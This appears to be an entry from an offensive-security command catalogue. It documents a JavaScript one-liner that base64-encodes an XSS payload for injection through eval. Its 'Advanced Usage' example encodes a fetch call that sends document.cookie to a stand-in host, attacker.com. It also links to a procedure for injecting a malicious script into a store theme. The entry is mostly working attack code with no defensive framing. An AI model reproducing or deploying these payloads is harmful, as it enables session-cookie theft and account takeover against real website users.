---
id: 123e4567-e89b-12d3-a456-426614174005
name: btoa-payload-encode
type: command
executor: javascript
data: >-
  let
  payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`)
output: Base64-encoded string of the payload.
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.693Z'
platforms:
  - Web
tags:
  - xss
  - encoding
verified: false
validated: true
submitted: true
---

# btoa-payload-encode

## Command

```javascript
let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`)
```

## Description

Base64-encodes a JavaScript payload that sends a success message to the opener window and alerts the current domain, used for injection via eval in the XSS exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| string | The JS code to encode (window.opener.postMessage...alert(document.domain)) | Yes |

## Examples

### Basic Usage

```javascript
let payload = btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
```

### Advanced Usage

```javascript
let customPayload = btoa(`fetch('https://attacker.com/steal?cookie=' + document.cookie);`);
```

## Expected Output

A base64 string, e.g., "d2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZSgnc3VjY2VzcycsbG9jYXRpb24ub3JpZ2luKTthbGVydChkb2N1bWVudC5kb21haW4p".

## Related

- [[Related Procedure|procedures/Modify-Store-Theme-to-Inject-Malicious-Script]]
